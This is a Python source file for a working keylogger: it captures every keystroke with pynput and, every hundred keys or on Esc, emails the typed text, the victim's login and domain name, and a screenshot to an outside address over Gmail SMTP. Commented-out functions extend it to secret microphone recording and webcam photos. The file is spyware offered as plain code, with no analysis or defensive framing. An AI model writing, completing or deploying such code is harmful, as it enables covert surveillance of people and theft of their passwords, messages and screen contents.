import smtplib, ssl, os, time

import pyautogui
import cv2
import numpy as np

# import sounddevice as sd
# from scipy.io.wavfile import write

from pynput.keyboard import Listener, Key

from email import encoders
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart

from constants import SENDER_EMAIL, RECEIVER_EMAIL, PASSWORD

keys = ""
count = 0

port = 465
smtp_server = "smtp.gmail.com"
sender_email = SENDER_EMAIL
receiver_email = RECEIVER_EMAIL
password = PASSWORD


def on_press(key):
    global keys, count
    count += 1

    try:
        keys = keys + str(key.char).replace("'", "")
    except AttributeError:
        if key == Key.enter:
            keys = keys + "\n"
        if key == Key.space:
            keys = keys + " "
        if key == Key.backspace:
            keys = keys + "/./"
    finally:
        if count == 100:
            send_email(keys)
            count = 0
            keys = ""


def on_release(key):
    if key == Key.esc:
        global keys
        send_email(keys)
        return False


def send_email(keys):
    try:
        message = MIMEMultipart("alternative")
        message["Subject"] = os.getlogin() + " : " + os.environ["userdomain"]
        message["From"] = sender_email
        message["To"] = receiver_email

        message.attach(MIMEText(keys, "plain"))

        take_screenshot(message)
        # record_audio(message)
        # take_picture(message)

        context = ssl.create_default_context()
        with smtplib.SMTP_SSL(smtp_server, port, context=context) as server:
            server.login(sender_email, password)
            server.sendmail(sender_email, receiver_email, message.as_string())
    except Exception as e:
        print(e)


def take_screenshot(message):
    filename = "screenshot.png"
    image = pyautogui.screenshot()
    image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)

    cv2.imwrite(filename, image)

    attach_file_to_email(message, filename)


def attach_file_to_email(message, file):
    with open(file, "rb") as f:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(f.read())
        f.close()

    os.remove(file)
    encoders.encode_base64(part)

    part.add_header(
        "Content-Disposition",
        f"attachment; filename={file}",
    )

    message.attach(part)


# def record_audio(message):
#     fs = 44100  # Sample rate
#     seconds = 10  # Duration of recording
#     filename = "sound.wav"

#     myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
#     sd.wait()  # Wait until recording is finished
#     write(filename, fs, myrecording)  # Save as WAV file

#     attach_file_to_email(message, filename)


# def take_picture(message):
#     camera_port = 0
#     filename = "photo.png"

#     camera = cv2.VideoCapture(camera_port)
#     time.sleep(0.1)  # If you don't wait, the image will be dark
#     _, image = camera.read()
#     cv2.imwrite(filename, image)
#     del camera

#     attach_file_to_email(message, filename)


with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
